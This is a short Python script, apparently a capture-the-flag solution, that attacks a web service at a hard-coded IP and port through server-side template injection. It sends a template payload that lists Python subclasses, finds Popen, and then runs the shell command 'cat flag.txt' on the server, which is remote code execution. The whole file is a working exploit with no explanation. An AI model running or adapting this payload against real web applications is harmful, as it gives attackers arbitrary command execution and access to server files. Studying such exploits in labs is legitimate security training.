#!/usr/bin/python3

import requests
import re

print(" Creating initial request...")
addr    = "159.65.48.79"
port    = 32023
payload = "''.__class__.__base__.__subclasses__()"
print(addr, port, payload)

print("sending request...")
r = requests.request(method="GET", url="http://%s:%s/{{%s}}"%(addr, str(port), payload))
r = r.content.decode().replace("&lt;", "<").replace("&gt;", ">").replace("&#39;","'")
r = re.search("\[.*\]", r)[0]
r = r.replace("[", '').replace("]", '')
r = r.split(',')

print("searching class in response...")
index = 0
for i in range(len(r)):
    if "Popen" in r[i]:
        print("class at index:", i, r[i])
        index = i

payload += "[%s]('cat flag.txt', shell=True, stdout=-1).communicate()"%(str(index))


print(" Creating final request...")
print(addr, port, payload)
r = requests.request(method="GET", url="http://%s:%s/{{%s}}"%(addr, str(port), payload))
r = r.content.decode().replace("&lt;", "<").replace("&gt;", ">").replace("&#39;","'")
print(r)
